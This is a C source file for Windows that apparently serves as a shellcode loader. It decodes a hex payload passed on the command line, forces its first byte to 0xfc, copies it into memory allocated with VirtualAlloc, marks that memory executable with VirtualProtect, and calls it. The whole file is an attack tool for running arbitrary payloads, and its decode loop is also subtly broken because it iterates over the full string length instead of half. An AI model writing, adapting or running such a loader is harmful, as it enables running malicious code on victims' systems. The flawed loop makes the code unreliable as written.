#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>

int main(int argc, char *argv[]) {


	unsigned int char_in_hex;




	char *shellcode = argv[1];
	unsigned int iterations = strlen(shellcode);



	unsigned int memory_allocation = strlen(shellcode) / 2; //memory we are going to allocate for shellcode




	for (unsigned int i = 0; i< iterations - 1; i++) {
		sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
		shellcode[i] = (char)char_in_hex;
	}

	char fisrt[] = "\xfc";

	void *exec = VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	memcpy(shellcode, fisrt, 1);
	memcpy(exec, shellcode, memory_allocation);
	DWORD ignore;
	VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);

	typedef void(*some_one)();
	some_one func = (some_one)exec;
	func();

	return 0;
}